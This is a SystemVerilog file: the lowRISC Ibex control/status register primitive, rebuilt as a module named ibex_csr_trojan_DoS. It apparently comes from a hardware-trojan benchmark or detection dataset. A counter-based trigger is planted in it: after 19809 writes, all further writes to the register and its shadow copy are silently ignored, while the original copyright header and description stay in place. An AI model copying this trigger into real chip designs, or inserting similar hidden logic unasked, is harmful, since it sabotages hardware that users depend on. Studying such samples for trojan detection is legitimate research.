// Copyright lowRISC contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

/**
 * Control / status register primitive
 */

//`include "prim_assert.sv"

module ibex_csr_trojan_DoS #(
  parameter int unsigned    Width      = 32,
  parameter bit             ShadowCopy = 1'b0,
  parameter bit [Width-1:0] ResetValue = '0
 ) (
  input  logic             clk_i,
  input  logic             rst_ni,

  input  logic [Width-1:0] wr_data_i,
  input  logic             wr_en_i,
  output logic [Width-1:0] rd_data_o,

  output logic             rd_error_o
);

    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=19809)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19809;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (wr_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end


  logic [Width-1:0] rdata_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      rdata_q <= ResetValue;
    end else if (wr_en_i && !trojan_active) begin
      rdata_q <= wr_data_i;
    end
  end

  assign rd_data_o = rdata_q;

  if (ShadowCopy) begin : gen_shadow
    logic [Width-1:0] shadow_q;

    always_ff @(posedge clk_i or negedge rst_ni) begin
      if (!rst_ni) begin
        shadow_q <= ~ResetValue;
      end else if (wr_en_i && !trojan_active) begin
        shadow_q <= ~wr_data_i;
      end
    end

    assign rd_error_o = rdata_q != ~shadow_q;

  end else begin : gen_no_shadow
    assign rd_error_o = 1'b0;
  end

  //`ASSERT_KNOWN(IbexCSREnValid, wr_en_i)

endmodule
